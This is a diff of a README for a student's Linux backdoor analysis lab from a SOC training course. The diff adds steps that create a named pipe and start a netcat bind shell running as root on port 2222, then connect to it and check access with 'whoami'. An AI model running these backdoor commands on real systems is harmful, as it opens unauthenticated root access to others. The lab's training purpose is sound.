@@ -14,7 +14,7 @@
 
 <h2>Program walk-through:</h2>
 
-<p align="center">
+<p align="left">
 In this Antisyphon lab (part of their fantastic SOC Core skills course with John Strand), I was looking at a backdoor using the Linux CLI.
 
 I used a large number of basic commands to get a better understanding of what the backdoor is and what it does.
@@ -27,20 +27,44 @@ The second was where we connect to it.
 
 The third was where we ran the analysis.
 
-On the Linux terminal, I used sudo su - to get a root prompt. This was so we could have a backdoor running as root and a connection from a different user account on the system.:<br/>
-<img src="https://imgur.com/RD2kkQd.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
-<br />
+<br/>
 
-  <p align="center">
+<br />On the Linux terminal, I used sudo su - to get a root prompt. This was so we could have a backdoor running as root and a connection from a different user account on the system.
+
+  <p align="left">
 I next needed to create a fifo backpipe:
     mknod backpipe p
 Next, let's start the backdoor with the following command:
 
 /bin/bash  0<backpipe | nc -l 2222 1>backpipe
 
-This was complicated for me but this basically created a backdoor listening on port 2222 of the linux system. <br/>
-<img src="[https://github.com/mdnorris1/LinuxCLILab/upload/main/ifconfig.png](https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/ifconfig.png)" height="80%" width="80%" alt="Disk Sanitization Steps"/>
+This was complicated for me but this basically created a backdoor listening on port 2222 of the linux system. 
+
+I had to find the IP address of our linux system using ifconfig command:
+
+<br/>
+<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/ifconfig.png" height="80%" width="80%" alt="ifconfig command"/>
 <br />
+
+Then we connected via the command
+
+ nc <whatever the ip address is here!> 2222
+
+
+The following commands made sure it was working
+
+ls
+
+whoami
+
+You can see below I was connected to the simple Linux backdoor as root, as it just dropped the cursor back to the left side of the screen.
+
+<br/>
+<img src="https://github.com/mdnorris1/LinuxCLILab/blob/main/assets/Clipboard_2020-12-11-07-19-48.png" height="80%" width="80%" alt="ifconfig command"/>
+<br />
+
+Next I had to open another Ubuntu terminal to start the analysis. 
+
 
 <!--
  ```diff
